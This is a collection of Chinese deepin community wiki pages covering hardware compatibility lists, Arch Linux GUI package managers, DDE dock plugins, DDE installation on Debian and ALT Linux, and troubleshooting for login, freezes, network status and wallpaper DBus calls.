宏碁适配的机型包括：笔记本Acer Aspire E1-570G@Intel(R) Core(TM) i3-3217U CPU、Acer Aspire 4752@Intel Core i3-2330M、Acer Aspire 4750@Intel Core i5-2430M。

华硕适配的机型包括：笔记本Asus X455LF Series@Intel Core i3-4005U、Asus X550JD Series Notebook@Intel Core i7-4710HQ、Asus X555LI Series Notebook@Intel Core i5-5200U。

惠普适配的机型包括：笔记本HP 348 G3@Intel Core i3-6100U、HP ProBook 430 G1@Intel Core i5-4200U，台式机HP Pavilion Desktop PC 570-p0xx@Intel(R) Celeron(R) CPU G3900。

联想适配的机型包括：笔记本Lenovo 20243@Intel Core i3-4030U、Lenovo ThinkPad Edge E530@Intel Core i5-3320M，台式机Lenovo YangTian R4910d@Intel Pentium G3220。

ONDA H110P PRO@Intel(R) Celeron(TM) G3900 的品牌是 昂达，机型是 台式机。 Dell Latitude E7240@Intel Core i5-4210U 的品牌是 戴尔，机型是 笔记本。 Dell Inspiron N5110@Intel Core i5-2450M 的品牌是 戴尔，机型是 笔记本。 Dell System Inspiron N4110@Intel Core i3-2330M 的品牌是 戴尔，机型是 笔记本。 Dell Inspiron N4050@Intel Core i3-2330M CPU 的品牌是 戴尔，机型是 笔记本。

标题：兼容性良好的笔记本型号
收集来自用户社区中的用户反馈的情况确定以下机型对deepin兼容性良好：建议大家按照品牌归类填写，可在品牌后面用中括号注明机器的配置格式【CPU/内存/显卡/硬盘/网卡/WiFi/有无蓝牙/屏幕尺寸】，小括号内注明一些问题。Google PixelBook：1.PixelBook 2013 完美支持；2.PixelBook 2015 (耳机孔无输出、蓝牙无输入，其余功能完美）。

华为 Huawei&荣耀：1.华为MateBook X Pro（指纹暂未支持）；2.荣耀MagicBook Intel版（指纹暂未支持）；3.荣耀MagicBook Amd R5版（亮度无法调节（会很暗），合盖后有几率无法启动，触摸板不太灵敏，RTL8822CE网卡驱动需要单独安装（https://github.com/alanfox2000/realtek-linux/tree/master/RTL8822CE））；4.华为MateBook 13 (八代i5, 8+256, 13寸)（指纹暂未支持，Huawei Share暂未支持，[更多优化及补丁](https://github.com/nekr0z/linux-on-huawei-matebook-13-2019)。）

联想 Lenovo & ThinkPad：注意!!! 联想部分型号无法使用WiFi,可能不一定是网卡驱动问题,也可能是联想的ideapad_laptop影响了deepin无线wifi硬件的开关,解决办法请自行搜索。联想系列：1.联想B460；2.联想B470；3.联想E4430a；4.联想G40（睡眠功能有一定机率睡死，其他正常）；5.联想G400S；6.联想G410；7.联想G480；8.联想G510（电池支持不太好有时开机充不进电关机可进行充电，双显卡不支持），配置【Intel I5 4210M 2.6GHz,集成显卡 Intel Graphics HD 4600 ,独立显卡 AMD Radeon R7 M265 ,硬盘 500GB 5400转,网卡 10/100Mbps自适应网卡,无线网卡 支持BGN协议的无线局域网,蓝牙 内置蓝牙模块,屏幕尺寸 15.6英寸,16:9,分辨率 1366×768,LED背光】。

联想小新Air 12（Elantech的触摸板无多点，但通过在/etc/default/grub的“GRUB_CMDLINE_LINUX_DEFAULT=”中加入”i8042.reset i8042.nomux=1“这两个参数后重启即可完美使用；耳机插口无法自动切换，需要手动切换）。联想小新Air14 2021锐龙版：CPU: AMD 5500U；内存: 16G 双通道 DDR4；硬盘: 500G + 500G双nvme硬盘；无线网卡: Intel AX210；其它: Win11和Deepin双系统；问题: 指纹识别无法使用。

ThinkPad 小黑系列：1.ThinkPad E431；2.ThinkPad E435；3.Thinkpad E450C；4.ThinkPad E455；5.ThinkPad E470；6.Thinkpad E540；7.ThinkPad E545；8.ThinkPad E570；9.ThinkPad E550（win10双系统进入win10会出现花屏并且进不去卡在花屏界面，使用深度修复工具可以修复）；10.Thinkpad T430；11.ThinkPad T430s；12.Thinkpad T440s；13.Thinkpad T460s；14.Thinkpad T470s；15.Thinkpad x230i；16.Thinkpad x240（安装后初始打开有wifi图标但是找不到网络，重启后就好了）；17.Thinkpad x270（不支持指纹登录，其余没有问题。建议装在固态硬盘上，启动会很快。）。

戴尔 Dell：1.Dell XPS15-9530；2.Dell XPS15-9550；3.Dell XPS15-9560-R1845【i7-7700HQ/ 16(8x2)GB DDR4/NVMe PM961 512GB SSD/nVidia GTX1050 4G/15存FHD非触屏】（因默认磁盘模式为raid，若安装deepin会出现检测不到硬盘的情况，需自行在bios把raid切换为achi，切换完毕后预装Win10无法正常进入，需启动安全模式进入系统，系统会自动修复更换模式后的硬盘驱动，之后重启恢复正常。使用过程没有发现什么问题，只是发热量较大以及耗电量较高。）；4.Dell 15R-5537；5.Dell 灵越14Z-5423；6.Dell 灵越15-7560（背光灯插电时不亮，4.12内核背光正常）。

宏碁 Acer：1.Acer 4741G；2.Acer 4743G；3.Acer 4750G；4.Acer 4752G；5.Acer E1-471G；6.Acer TMP-258MG；7.Acer S7；8.Acer VN7-592G（麦克风有点问题）；9.Acer VN7-591G（声音人声有点远空洞、麦克风有杂音）；10.Acer E5-572G；11.Acer T5000；12.Acer E5-573G【i5-5200/8GB/240GB SSD】（关机问题：关机时会显示reboot: system halted错误，至今没有解决；开机问题：报ACPI错误；）。

华硕 ASUS：1.ASUS A550VC-i5-3230；2.ASUS A550-JK4200（没测独立显卡）；3.ASUS K45VM；4.ASUS K555L；5.ASUS K43SV；6.ASUS K55D；7.ASUS N551JK；8.ASUS U303LB5200（各项驱动使用正常，续航有待提升）；9.ASUS U306U；10.ASUS U31J（风扇一直中速运转，发热厉害，其他正常）；11.ASUS VM590ZE；12.ASUS X556UB(FL5900U)（WIFI驱动貌似有点问题，不能切换独显，其他都完美使用）；13.ASUS A550L（除了蓝牙无法被系统识别，其他一切正常）。

小米 Xiao Mi：1.小米 Air13.3-6代cpu；2.小米 Air13.3 - i5 7200 - 指纹 - MX150；3.小米 AIr12.5；4.小米笔记本Air 13.3" i7-7500U - 指纹 - MX150；5.小米笔记本Air 13.3" i5-8250U - 指纹 - MX150（对指纹不支持）；6.小米笔记本Pro 15.6" i5-8250U - 指纹 - MX150（对指纹不支持）；7.小米笔记本Pro 15.6" i7-8550U - 指纹 - MX150。

惠普 Hewlett-Packard：1.惠普dv4-5305tx；2.惠普 Pavilion dv1702TU(内存升级到2G后)；3.惠普ENVY 15-K222TX L；4.惠普ENVY 15-K215TX L；5.惠普ENVY 15-K221TX L；6.惠普Pavilion 15-P026NR (AMD CPU)；7.惠普Pavilion 15-R221TX（蓝牙和WiFi需要驱动，安装github上提供的即可。WiFi仅支持只连接无线网络或只开热点两种模式。具体步骤可参照相关帖子）；8.惠普OMEN 暗影精灵4 (I7+1060)（安全启动可安装deepin；网卡Intel9560无驱动，去官网下载，官网有说明。）。

联想笔记本特殊注意事项：

联想常规型号兼容情况：

ThinkPad兼容性详情：

标题：ArchLinux中用于包管理的图形化应用
Arch Linux中用于包管理的图形化应用
安装Arch Linux有一些挑战性。这就是为什么有几个基于Arch的发行版通过提供图形化的安装程序使事情变得简单。即使你设法安装了Arch Linux，你也会注意到它严重依赖命令行。如果你需要安装应用或更新系统，那么必须打开终端。是的！Arch Linux没有软件中心。我知道，这让很多人感到震惊。如果你对使用命令行管理应用感到不舒服，你可以安装一个GUI工具。这有助于在舒适的图形化界面中搜索包以及安装和删除它们。

Apper 是一个精简的 Qt5 应用，它使用 PackageKit 进行包管理，它还支持 AppStream 和自动更新。但是，没有 AUR 支持。要从官方仓库安装它，请使用以下命令：sudo pacman -Syu apper

深度应用商店是使用 DTK（QT5）构建的深度桌面环境的应用商店，它使用 PackageKit 进行包管理，支持 AppStream，同时提供系统更新通知。 没有 AUR 支持。要安装它，请使用以下命令：sudo pacman -Syu deepin-store

发现应用不需要为 KDE Plasma 用户介绍。它是一个使用 PackageKit 的基于 Qt 的应用管理器，支持 AppStream、Flatpak 和固件更新。要在发现应用中安装 Flatpak 和固件更新，需要分别安装 flatpak 和 fwupd 包。它没有 AUR 支持。sudo pacman -Syu discover packagekit-qt5

GNOME PackageKit 是一个使用 PackageKit 技术的 GTK3 包管理器，支持 AppStream。不幸的是，没有 AUR 支持。要从官方仓库安装它，请使用以下命令：sudo pacman -Syu gnome-packagekit

GNOME 软件(Software) 应用不需要向 GNOME 桌面用户介绍。它是使用 PackageKit 技术的 GTK4 应用管理器，支持 AppStream、Flatpak 和固件更新。它没有 AUR 支持。要安装来自 GNOME 软件应用的 Flatpak 和固件更新，需要分别安装 flatpak 和 fwupd 包。安装它使用：sudo pacman -Syu gnome-software-packagekit-plugin gnome-software

tkPacman 是用 Tcl 编写的 Tk pacman 封装。界面类似于 Synaptic 包管理器。由于没有 GTK/Qt 依赖，它非常轻量级，因为它使用 Tcl/Tk GUI 工具包。它不支持 AUR，这很讽刺，因为你需要从 AUR安装它。你需要事先安装一个 AUR 助手，如 yay。yay -Syu tkpacman

Octopi 可以认为是 tkPacman 的更好看的表亲。它使用 Qt5 和 Alpm，还支持 Appstream 和 AUR（通过 yay）。你还可以获得桌面通知、仓库编辑器和缓存清理器。它的界面类似于 Synaptic 包管理器。要从 AUR 安装它，请使用以下命令。yay -Syu octopi

Pamac 是 Manjaro Linux 的图形包管理器。它基于 GTK3 和 Alpm，支持 AUR、Appstream、Flatpak 和 Snap。Pamac 还支持自动下载更新和降级软件包。它是 Arch Linux 衍生版中使用最广泛的应用。但因为 DDoS AUR gitlab.manjaro.org而臭名昭著。在 Arch Linux 上安装 Pamac有几种方法。最简单的方法是使用 AUR 助手。yay -Syu pamac-aur

要删除任何上面图形化包管理器以及依赖项和配置文件，请使用以下命令将packagename替换为要删除的包的名称。sudo pacman -Rns packagename。这样看来，Arch Linux 也可以在不接触终端的情况下使用合适的工具。还有一些其他应用程序也使用终端用户界面（TUI）。一些例子pcurses、cylon、pacseek和yup但是，这篇文章只讨论那些有适当的GUI的软件。注意： PackageKit默认打开系统权限，因而不推荐用于一般用途。因为如果用户属于 wheel组，更新或安装任何软件都不需要密码。

Arch Linux中用于包管理的图形化应用
1、Apper。Apper是一个精简的Qt5应用，它使用PackageKit进行包管理，它还支持AppStream和自动更新。但是，没有AUR支持。要从官方仓库安装它，请使用以下命令：`sudo pacman -Syu apper`

Arch Linux中用于包管理的图形化应用
2、深度应用商店。深度应用商店是使用DTK（QT5）构建的深度桌面环境的应用商店，它使用PackageKit进行包管理，支持AppStream，同时提供系统更新通知。没有AUR支持。要安装它，请使用以下命令：`sudo pacman -Syu deepin-store`

Arch Linux中用于包管理的图形化应用
3、KDE发现应用。发现应用不需要为KDE Plasma用户介绍。它是一个使用PackageKit的基于Qt的应用管理器，支持AppStream、Flatpak和固件更新。要在发现应用中安装Flatpak和固件更新，需要分别安装flatpak和fwupd包。它没有AUR支持。`sudo pacman -Syu discover packagekit-qt5`

Arch Linux中用于包管理的图形化应用
44、GNOME PackageKit。GNOME PackageKit是一个使用PackageKit技术的GTK3包管理器，支持AppStream。不幸的是，没有AUR支持。要从官方仓库安装它，请使用以下命令：`sudo pacman -Syu gnome-packagekit`

Arch Linux中用于包管理的图形化应用
5、GNOME软件应用。GNOME软件(Software)应用是使用PackageKit技术的GTK4应用管理器，支持AppStream、Flatpak和固件更新。它没有AUR支持。要安装来自GNOME软件应用的Flatpak和固件更新，需要分别安装flatpak和fwupd包。安装它使用：`sudo pacman -Syu gnome-software-packagekit-plugin gnome-software`

Arch Linux中用于包管理的图形化应用
6、tkPacman。它是用Tcl编写的Tk pacman封装。界面类似于Synaptic包管理器。由于没有GTK/Qt依赖，它非常轻量级，因为它使用Tcl/Tk GUI工具包。它不支持AUR，这很讽刺，因为你需要从AUR安装它。你需要事先安装一个AUR助手，如yay。`yay -Syu tkpacman`

Arch Linux中用于包管理的图形化应用
7、Octopi。它使用Qt5和Alpm，还支持Appstream和AUR（通过yay）。你还可以获得桌面通知、仓库编辑器和缓存清理器。它的界面类似于Synaptic包管理器。要从AUR安装它，请使用以下命令：`yay -Syu octopi`

Arch Linux中用于包管理的图形化应用
8、Pamac。Pacam是Manjaro Linux的图形包管理器。它基于GTK3和Alpm，支持AUR、Appstream、Flatpak和Snap。Pamac还支持自动下载更新和降级软件包。它是Arch Linux衍生版中使用最广泛的应用。在Arch Linux上安装Pamac：`yay -Syu pamac-aur`

Arch Linux中用于包管理的图形化应用
要删除任何上面图形化包管理器，请使用：`sudo pacman -Rns packagename`。PackageKit默认打开系统权限，因而不推荐用于一般用途。因为如果用户属于wheel组，更新或安装任何软件都不需要密码。你看到了在Arch Linux上使用图形化软件中心的几种选择。

标题：DDE-Dock插件
本页面收集了用于DDE-Dock的插件。dde-top-panel等由dde-dock衍生的dock/panel同样支持这些插件。

使用方法：下载、解压后，将.so文件拷贝至~/.local/lib/dde-top-panel/plugins或者~/.local/lib/dde-dock/plugins，后重启panel或dock即可。

开发文档：官方文档链接为https://github.com/linuxdeepin/dde-dock/blob/master/plugins/plugin-guide/plugins-developer-guide.md。

dde-mpris2-plugin：支持音乐控制及歌词显示。论坛链接：https://bbs.deepin.org/zh/post/220429；repo链接：https://github.com/SeptemberHX/dde-mpris2-plugin。

dde-sys-monitor-plugin：deepin系统监控dock插件，可监控CPU使用率、内存使用率、swap使用率、上传下载总量、实时网速和电池放电功率，有文字模式和图表模式可选。论坛链接：https://bbs.deepin.org/zh/post/179425；repo链接：https://gitee.com/q77190858/dde-sys-monitor-plugin/。

lfxspeed：网速插件。论坛链接：https://bbs.deepin.org/zh/post/206895；repo链接：https://github.com/xmuli/lfxspeed。

NetPlugin：网速插件，lfxspeed的重构版本。blog链接：https://xmuli.blog.csdn.net/article/details/113573870；论坛链接：https://github.com/xmuli/NetSpeed。

标题：debian安装深度桌面
debian镜像下载地址：https://www.debian.org/download。镜像安装步骤：1、在引导界面选择Graphical install（图形化安装），进入安装过程。2、选择语言界面，选择中文。3、区域选择，选择中国。4、主机名，填写debian。5、域名可不填，直接下一步。6、设置root密码为root，超级管理员账户。

镜像安装步骤：7、建立新用户，这个只是个昵称，不是登录时的用户名，可以根据自己喜好填。8、接下来就是设置登录时的用户名了，设置时要多注意，并且一定要记住。9、设置用户密码。10、接下来该磁盘分区了，有空闲分区的话推荐使用安装程序进行自动分区，当然也可以手动分区。11、自动分区的话如果是新手推荐“将所有文件放在同一个分区中”，有经验的就根据自己喜好调整。12、手动分区的话一定要记住挂载/根目录，否则会报错。

镜像安装步骤：13、Swap分区（交换分区）推荐大小为物理内存的两倍，比如实际内存为2G，swap给上4G就行。14、完成调整后保存分区表即可。15、需要注意的是需要记住挂载 根目录/ 的分区号，方便后面安装grub。16、选择软件包进行安装，建议全不选，需要的后面会手动安装，在此时安装的桌面环境话会连接安全服务器更新内核，速度会非常慢。17、安装完成后就是配置Grub了，如果不想用Grub替换MBR，就选手动输入。18、然后输入前面配置的挂载根目录/的文件系统，比如前面用的是/sda1，这里就输入/dev/sda1。（不用特殊处理，直接忽略，按默认继续）

镜像安装步骤：19、安装完成后，拔掉启动U盘，直接点继续。20、直接按回车进入Debian，等系统加载完如果出现登录界面就说明启动成功了。21、在login后输入root，password后输入设置的超级管理员密码，以超级管理员权限进入系统。

安装DDE桌面环境：使用命令 ```sudo vi /etc/apt/sources.list.d/deepin-git.list```添加以下内容: deb [trusted=yes arch=amd64] https://deepin-community.github.io/debian-sid-dde-deps-repo sid main deb [trusted=yes arch=amd64] https://deepin-community.github.io/debian-sid-dde-repo sid main。添加成功后执行：sudo apt update、sudo apt install startdde、sudo apt install deepin-desktop-environment-core、sudo systemctl enable lightdm。安装完成后重启,登录进入DDE桌面环境。

标题：deepin无法登录的问题分析及解决
常见情况是从dde-daemon升级到新的deepin-authenticate认证框架之后需要重启来完成认证框架的启动和关闭。查看/etc/pam.d/common-auth下面的文件是否包含deepin-authenticate的字样，表示文件已经被替换为了新的认证框架配置文件。如果已经安装deepin-authenticate但是/etc/pam.d/common-auth下面的配置文件是dde-daemon覆盖的将导致无法登陆。查看/var/log/authinfo.log中给出的信息。快速解决办法:切换到tty,然后重新安装deepin-authenticate 即  sudo apt reinstall deepin-authenticate。

deepin-desktop-schemas安装过程中出现异常，导致配置没有跑完。查看`vim ~/.xsession-errors`中报错“com.deepin.dde.display”缺少”color-template-mode“。通过`gsettings list-keys com.deepin.dde.display`发现列出来的方法正好缺少上面报错的那个”color-template-mode“。搜索“com.deepin.dde.display”发现在startdde中定义的，查看startdde版本是否正确。用`dpkg -S com.deepin.dde.display.gschema.xml`查看这个属于deepin-desktop-schemas。用`apt policy deepin-desktop-schemas`查看版本是否正确。查看`vim com.deepin.dde.display.gschema.xml`文件内容是否正确。用`sudo glib-compile-schemas /usr/share/glib-2.0/schemas/`将「/usr/share/glib-2.0/schemas/」里面的「*.gschema.xml」编译成「/usr/share/glib-2.0/schemas/gschemas.compiled」，再用gsettings list-keys，就正常了。

此问题在登陆界面已经认证成功，开启x11 session失败导致无法进入桌面环境。具体需要查看当前登陆用户目录下的～/.xsession-errors。具体查看的内容是看startdde是否拉起dde-desktop, dde-dock等基础桌面环境。经常出现的问题是：更新后startdde被卸载导致无法进入桌面环境，需要重新安装startdde。另一种情况是startdde调用的gsettings文件不存在，导致startdde退出从而无法进入桌面环境。

标题：deepin桌面卡死如何处理
桌面卡死可能出现的情况有：1. 桌面环境卡死；2. Xorg 卡死；3. 启用某个进程导致（如打开wine qq）。解决方法：Ctrl + Alt + T 启用终端（Terminal）；若终端无法启用，使用 Ctrl + Alt + Fn(主要针对笔记本) + F2/F3/F4/F5/F6 进入tty界面，需输入帐户、密码。对于桌面环境卡死，执行命令：sudo systemctl restart lightdm。对于 Xorg 卡死，执行命令：sudo killall Xorg。对于某个特定进程导致桌面卡死，可输入命令top查看进程CPU占用率，CPU占用100%的进程异常，需杀死该进程，执行命令：kill -9 PID（PID为进程号），然后使用快捷键Ctrl + Alt + F1回到图形界面。若以上方法无法解决，也可以直接使用重启命令：reboot。

标题：Deepin桌面卡死该怎么办
全屏游戏卡死无法退出时，Deepin/UOS可以利用虚拟桌面功能，按 ⊞ + → 切换到第二虚拟桌面，然后在这里打开系统监视器，结束卡死的进程。

如果是整个桌面卡死，首先尝试：按 Ctrl + Alt + F2，进入tty2；按 Ctrl + Alt + F1，回到桌面，可能会要求重新登录，卡死缓解。注意：按 Ctrl + Alt + F1 回到桌面仅适用于 UOS/Deepin 的 LightDM 登录器，其他发行版或登录器可能需要按 Ctrl + Alt + F7 或者 Ctrl + Alt + F6 等，你可以逐一尝试 F1 到 F7。

如果没有缓解：按 Ctrl + Alt + F2，进入tty2；输入用户名，回车；输入密码，回车；输入以下命令回车：killall kwin_x11；按 Ctrl + Alt + F1，回到桌面，可能会要求重新登录，卡死缓解。注意：killall kwin_x11 仅适用于UOS/Deepin的DDE桌面环境，其他发行版或桌面环境需要把 kwin_x11 更换为各自采用的桌面合成器。

如果没有缓解：按 Ctrl + Alt + F2，进入tty2，然后执行命令：ps ux | less；找到引起卡死的进程id，比如1234，然后执行以下命令：kill -9 1234；如果想使用进程名称，也可以，比如：killall -9 TIM.exe；注意进程名称区分大小写！Linux中的大部分名称都区分大小写。然后按 Ctrl + Alt + F1，回到桌面，可能会要求重新登录，卡死缓解。

如果还是没有缓解：按 Ctrl + Alt + F2，进入tty2，执行以下命令：sudo systemctl restart lightdm；按 Ctrl + Alt + F1，回到桌面，会要求重新登录，所有应用程序，卡死缓解。

如果还是没有缓解：按 Ctrl + Alt + F2，进入tty2；按 Ctrl + Alt + Delete 这会重启。

如果连按 Ctrl + Alt + F2 都没有反应，无法进入tty2，还可以这样：按住 Alt 和 PrtSc / SysRq 键（截图键），然后再按以下键可以重启：S U B。也就是依次按下三组快捷键：Alt + SysRq + S；Alt + SysRq + U；Alt + SysRq + B；就可以重启，对系统没有损害。上述重启方法对deb系有效（包括UOS/Deepin），对rpm系无效，除非你手动设置内核参数kernel.sysrq=1。

除了未开启SysRq功能之外（某些发行版默认没开），如果连 Alt + SysRq + B 也没用，按下后系统无法重启，说明内核可能已经崩溃了。你只能用传统手段强制重启或者强制关机了。

标题：Desktop图标文件生成器
Desktop图标文件生成器是由zinface制作的小工具，能用GUI界面制作desktop文件，是提供基于Linux平台的desktop文件自动化生成工具。其仓库/分支地址为https://gitee.com/zinface/z-tools/tree/desktop-dev，版本历史中有Release desktop-generater v1.1，参见链接为https://bbs.deepin.org/post/231528。

标题：DOCK异常
当dock上图标一会有一会又没有, 或者dock位置不能点击,或者dock位置变到最上面。这种情况一般都是dde-session-daemon在不断重启(此时可以进入桌面)。在终端输入 : /usr/lib/deepin-daemon/dde-session-daemon 输入上述命令后, 会将错误日志打印出来, 此时大概率是deepin-desktop-schemas版本与dde-daemon不匹配。1.下载或者从其他机器拷贝与dde-daemon版本匹配的deepin-desktop-schemas, 然后进行安装2.如果无法拿到新版本的deepin-desktop-schemas的deb包, 可以将dde-daemon降级; 通过apt policy dde-daemon, 查询dde-daemon的版本信息, 可以使用命令安装其他版本: sudo apt install dde-daemon=xxx

标题：任务栏网络图标状态异常
当网络出现感叹号时并提示‘已连接网络但无法访问互联网’，但本身可以上网，可能是公司联通性检测的网站不稳定造成的，可以切换到其他的网址。在有感叹号的时候，可以尝试终端执行一下这个命令：curl http://packages.deepin.com/misc/check_network_status.txt。正常状态时截图为：[图片]。若出现以上截图中情况，但是网络图标仍异常则：1. 终端中输入命令：sudo vim /etc/NetworkManager/NetworkManager.conf 。配置文件内容如下：[main] plugins=ifupdown,keyfile [ifupdown] managed=true [device] wifi.scan-rand-mac-address=no [connectivity] uri=http://packages.deepin.com/misc/check_network_status.txt 2. 可以把 connectivity 下的 uri 替换为以下网址：http://connectivity-check.ubuntu.com/或http://network-test.debian.org/nm。3. 然后重启 network-manager，终端中输入命令systemctl restart NetworkManager。

获取log前的操作：1. 先修改一下配置文件：# 先编辑如下文件，修改第13行内容 sudo vim /lib/systemd/system/NetworkManager.service # 改成如下内容：ExecStart=/usr/sbin/NetworkManager --no-daemon --log-level=TRACE （也就是增加--log-level=TRACE 参数）2. 修改之前截图：[图片]3. 修改之后截图：[图片]4. 重启系统，获取日志：sudo journalctl -b 0 > ~/Desktop/info.log 。执行上述命令后，会在桌面生成一个info.log的日志文件，到时候把这个文件提供出来就可以啦。当然执行的时候，确保是该问题复现的。

标题：升级后没有网络模块了？
遇到过部分用户在使用终端升级后，发现控制中心的网络模块没有了，目前发现的有几点原因，以下提供一种可能的解决方法。

可能用户通过终端升级时使用的命令是：sudo apt upgrade 通过终端用此命令升级时，在处理部分推荐依赖时，不会做处理，从而可能导致部分推荐依赖模块不会被升级，从而还会被处理掉，导致一些功能模块的包没有了，也就影响了部分功能了。

- 升级时还是推荐通过控制中心来升级，控制中心会处理这类推荐依赖，不会造成这种升级后将部分功能包给干没了的情况；- 终端升级时，也尽量使用：sudo apt dist-upgrade 命令来处理升级，相比sudo apt upgrade 此命令会处理更多的事情，或许更稳当一些（当然，这其中的机理还没细研究，需要大佬给予一些科普）

如果出现了升级后，图标没有的情况，大家也可以试试如下办法时候可行：安装如下包后，重启试试是否有效：sudo apt install dde-network-dialog

标题：壁纸相关操作及命令行
壁纸功能是可视化操作系统的基础功能，桌面支持为分别每个显示器设置壁纸。设置壁纸通过DBus调用com.deepin.daemon.Appearance服务的SetMonitorBackground方法实现。DBus服务：服务名：com.deepin.daemon.Appearance；地址：/com/deepin/daemon/Appearance；接口：com.deepin.daemon.Appearance。DBus方法：SetMonitorBackground (String monitorName, String imageFile) ↦ ()。参数：@monitorName 为显示器名字，如“HDMI-0”、“VGA-0”、“eDP-1”等，显示器名称可从com.deepin.daemon.Display服务列表中/com/deepin/daemon/Display/Monitor_×（×表示编号）的com.deepin.daemon.Display.Monitor接口中的"Name"属性获取；也可从控制中心显示中获取。@imageFile 壁纸图片URL路径，如"file: /usr/share/wallpapers/deepin/desktop.jpg"。

壁纸图片路径可以是壁纸库里的文件或者用户自己的图片路径，Appearance服务会将用户自定义的壁纸保存到壁纸库中。用户自定义的壁纸的存储地址为:file: /usr/share/wallpapers/custom-wallpapers。系统自带的壁纸的存储地址为:file: /usr/share/wallpapers/deepin。命令行: qdbus com.deepin.daemon.Appearance /com/deepin/daemon/Appearance com.deepin.daemon.Appearance.SetMonitorBackground  "@monitorName" "@imageFile" 或 dbus-send --session --print-reply=literal --dest=com.deepin.daemon.Appearance /com/deepin/daemon/Appearance   com.deepin.daemon.Appearance.SetMonitorBackground string:"@monitorName" "@imageFile"。

获取壁纸列表通过DBus调用com.deepin.daemon.Appearance接口的List方法实现。DBus服务：服务名：com.deepin.daemon.Appearance；地址：/com/deepin/daemon/Appearance；接口：com.deepin.daemon.Appearance。DBus方法：List (String ty) ↦ (String list)。参数：@type 类型，值为"background"。命令行：dbus-send --session --type=method_call --print-reply --dest=com.deepin.daemon.Appearance /com/deepin/daemon/Appearance  com.deepin.daemon.Appearance.List string:'@type'。

删除壁纸通过DBus调用com.deepin.daemon.Appearance接口的Delete方法实现，可从上述获取壁纸列表中查看壁纸的”Deletable“属性，属性值为”True“，则表示该壁纸可被删除（一般系统自带的壁纸和桌面当前使用的壁纸是不可被删除的）。DBus服务：服务名：com.deepin.daemon.Appearance；地址：/com/deepin/daemon/Appearance；接口：com.deepin.daemon.Appearance。DBus方法：Delete (String type, String name) ↦ ()。参数：@type 类型，值为"background"；@name 壁纸图片URL路径，如"file: /usr/share/wallpapers/deepin/desktop.jpg"。命令行：dbus-send --session --type=method_call --print-reply --dest=com.deepin.daemon.Appearance /com/deepin/daemon/Appearance  com.deepin.daemon.Appearance.Delete string:'@type' string:'@name'。

获取桌面当前壁纸的保存路径，通过DBus调用com.deepin.wm接口的GetCurrentWorkspaceBackgroundForMonitor方法实现。DBus服务：服务名：com.deepin.wm；地址：/com/deepin/wm；接口：com.deepin.wm。DBus方法：GetCurrentWorkspaceBackgroundForMonitor (String strMonitorName) ↦ (String result)。参数：@strMonitorName 为显示器名字，如“HDMI-0”，显示器名称可从com.deepin.daemon.Display服务列表中/com/deepin/daemon/Display/Monitor_×（×表示编号）的com.deepin.daemon.Display.Monitor接口中的"Name"属性获取。命令行：dbus-send --session --type=method_call --print-reply --dest=com.deepin.wm /com/deepin/wm  com.deepin.wm.GetCurrentWorkspaceBackgroundForMonitor string:'@strMonitorName'。

标题：如何在ALT Linux上安装DDE桌面环境
ALT Workstation: Operating system and application suite designed for workplace at both office and home.

ALT KWorkstation: Operating system with Plasma desktop and application suite designed for workplace at both office and home.

ALT Server: Operating system and services to bring up and control enterprise IT infrastructure.

ALT Virtualization 11: Operating system for enterprise virtualization.

ALT Education: Operating system for all kinds of educational institutions from preschool to high school which provides integration of both students' and teacher's workplaces.

Simply Linux: Operating system for everyone. Easy to use and lightweight, functional and secure.

Starter kits: Starter kits are freely distributable images based on the stable ALT repository and designed for experienced users and developers of derivative solutions.

The regular image builds are intended to aid those interested in ALT Sisyphus and the current state of Linux desktop environments (at least as packaged there). These are not the fully fledged properly tailored distributions but rather targeted technology demos that can happen to be useful either (the release manager's current laptop is installed using one of those -- did I mention these are installable LiveCDs?).

Please note that regular images are built using the unstable development repository (think debian testing).

On May 22, 2024, the latest images were builded on i586, after which they were moved to the archive: https://nightly.altlinux.org/sisyphus/archive/ There are no plans to resume building i586 images on Sisyphus.

Please refer to aarch64 (nee ARMv8), mipsel (MIPS32) and riscv64 (RV64GC) specific pages for more information on running the images in QEMU and on corresponding hardware.

main Gnome: x86_64: iso , rootfs ; aarch64: iso, rootfs KDE: x86_64: iso , rootfs; aarch64: iso, rootfs LXQt: x86_64: iso, rootfs; aarch64: iso ,rootfs; riscv64: rootfs Xfce: x86_64: iso , rootfs; aarch64: iso,rootfs, riscv64: rootfs

auxiliary Cinnamon: x86_64, aarch64 Enlightenment[1] : x86_64 IceWM: x86_64 MATE: x86_64; aarch64: iso; riscv64: rootfs

experimental GNUstep: x86_64

archived KDE4: i586, x86_64 (1.5 Gb) 20180418 TDE: i586, x86_64 (~750Mb) 20170111 WindowMaker (sysvinit): i586, x86_64 20200115 LXDE: i586, x86_64 20230913 IceWM (sysvinit): i586, x86_64 20240103 GNUstep (sysvinit): i586, x86_64 20240103

non-desktop rescue: x86_64 , aarch64 jeos[2] : x86_64: iso, img; aarch64: iso,rootfs; riscv64: rootfs

The images are autobuilt weekly (on Wednesdays, Moscow time) but we can release updated ones manually as often as daily.

<table><tr><th>Starterkits</th><th>Regular</th></tr><tr><td>quarterly</td><td>weekly</td></tr><tr><td>stable</td><td>current</td></tr><tr><td>rescue, livecd, installer, server, vm</td><td>rescue, livecd, jeos</td></tr></table>

正式版下载地址：https://getalt.org
Sisyphus 版下载地址：https://en.altlinux.org/Regular
Sisyphus 是由 ALT Linux 团队开发和维护免费和开源软件存储库，适合作为发行版 LiveCD 构建的基础。 Sisyphus 中的软件往往比较新但不保证稳定性。
Alt Worstation 10 暂时还不能使用 DDE，推荐使用 Sisyphus 版本尝鲜。

ALT Linux 是一个使用 apt-get/rpm 进行包管理，首次安装推荐更新系统和仓库。
```bash
apt-get update
apt-get dist-upgrade
```
安装完整 DDE 组件：
```bash
apt-get install deepin-full
```
重启后可以选择进入 DDE

标题：如何在ArchLinux发行版上安装DDE桌面环境
